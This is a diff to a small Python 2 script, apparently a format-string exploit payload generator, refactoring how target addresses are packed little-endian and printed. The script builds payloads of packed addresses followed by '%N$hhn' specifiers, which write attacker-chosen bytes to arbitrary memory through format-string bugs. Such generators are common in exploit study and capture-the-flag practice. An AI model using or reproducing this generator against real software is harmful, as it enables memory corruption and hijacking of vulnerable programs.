@@ -2,12 +2,7 @@
 # encoding: utf-8
 
 import argparse
-
-def toHexFormat(string):
-    retour = ""
-    for char in string:
-        retour += "\\x" + hex(ord(char))[2:].rjust(2, "0")
-    return retour
+from struct import pack
         
 def main():
 	
@@ -21,11 +16,10 @@ def main():
 	# add addr_to_o on the payload
 	payload = ""
 	for i in range(4):
-	    addr = hex(int(args.addr_to_o,16) + i)[2:].rjust(8, "0")
-	    payload += toHexFormat(addr.decode("hex")[::-1])
-	
+	    payload += pack('<i', int(args.addr_to_o, 16)+i)
+
 	# format addr_to_w
-	addr_to_w = args.addr_to_w.decode("hex")[::-1]
+	addr_to_w = pack('<i', int(args.addr_to_w, 16))
 	
 	# add addr_to_w on the payload
 	total = 16
@@ -43,7 +37,7 @@ def main():
 	    else:
 	        payload += "%{0}$hhn".format(int(args.format_number)+i)
 	        
-	print "Your payload :\n" + payload
+	print "Your payload : \n%s" % (repr(payload)[1:-1])
 	    	    
 if __name__ == '__main__':
 	main()
